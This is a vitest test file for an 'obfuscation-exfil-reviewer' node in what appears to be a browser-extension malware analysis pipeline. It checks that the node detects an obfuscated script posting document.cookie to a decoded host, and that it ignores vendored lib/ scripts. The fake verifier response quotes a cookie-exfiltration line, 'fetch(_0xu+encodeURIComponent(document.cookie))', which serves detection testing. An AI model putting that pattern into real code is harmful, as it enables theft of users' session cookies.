import { describe, it, expect } from "vitest";
import { analyzeCorpus } from "../scripts/analyze-corpus.ts";
import { FakeLlmClient } from "../src/llm/fake.ts";
import { obfuscationExfilReviewer } from "../src/methodologies/dag/nodes/obfuscation-exfil-reviewer.ts";
import type { NodeContext } from "../src/methodologies/dag/node.ts";
import type { EvidencePack, ScriptEntry } from "../src/pipeline/schema.ts";

const results = analyzeCorpus("corpus", { analyzedAt: "2026-01-01T00:00:00Z" });
const packs = new Map(results.map((r) => [r.sample, r.pack]));
const SAMPLE = "mutant-c-obfuscated-decoder";
const SAMPLE_DIR = `corpus/${SAMPLE}/extension`;

const CONFIRMED_JSON = JSON.stringify({
  verdict: "confirmed",
  grounding_line: { file: "js/_locale_pack.js", line: 4 },
  rationale: "an obfuscated routine decodes a host and posts document.cookie to it via fetch",
  evidence_quote: "fetch(_0xu+encodeURIComponent(document.cookie))",
});

function fakeClient(): FakeLlmClient {
  return new FakeLlmClient({
    "verify:claim": { text: CONFIRMED_JSON, usage: { inputTokens: 7, outputTokens: 3 } },
  });
}

function ctx(pack: EvidencePack, client = fakeClient()): NodeContext {
  return { pack, sampleDir: SAMPLE_DIR, upstream: new Map(), listing: null, enrichment: null, client, model: "test-model", verifierModel: "test-model" };
}

describe("obfuscation-exfil-reviewer", () => {
  it("fires on a first-party obfuscated cookie→fetch file and confirms the exfil behavior", async () => {
    const pack = packs.get(SAMPLE)!;
    const c = ctx(pack);

    expect(obfuscationExfilReviewer.gate(c)).toBe(true);

    const result = await obfuscationExfilReviewer.run(c);
    expect(result.status).toBe("ok");

    const finding = result.findings.find((f) => f.evidence_refs.some((r) => r.file === "js/_locale_pack.js"));
    expect(finding).toBeDefined();
    expect(finding!.category).toBe("data-exfiltration");

    expect(result.verdicts.some((v) => v.verdict === "confirmed")).toBe(true);
  });

  it("does NOT fire on an obfuscated script under lib/ (vendored libs are the tamper node's job)", () => {
    const libScript: ScriptEntry = {
      path: "lib/sneaky.min.js",
      parsed_ok: true,
      sinks: [
        { category: "network", api: "fetch", location: { line: 1 }, snippet: "fetch(x)" },
        { category: "cookies", api: "document.cookie", location: { line: 1 }, snippet: "document.cookie" },
      ],
      network_destinations: [{ value: "x", kind: "unknown", ast_role: "fetch.url", location: { line: 1 } }],
      taint_sketches: [],
      listeners: [],
      obfuscation: {
        mean_identifier_length: 1,
        identifier_entropy: 4,
        hex_escape_density_per_kb: 0,
        string_array_decoder_detected: true,
        packer_signature: null,
        flagged: true,
      },
    };
    const pack = { scripts: [libScript], files: [], cross_file: {} } as unknown as EvidencePack;
    expect(obfuscationExfilReviewer.gate(ctx(pack))).toBe(false);
  });
});
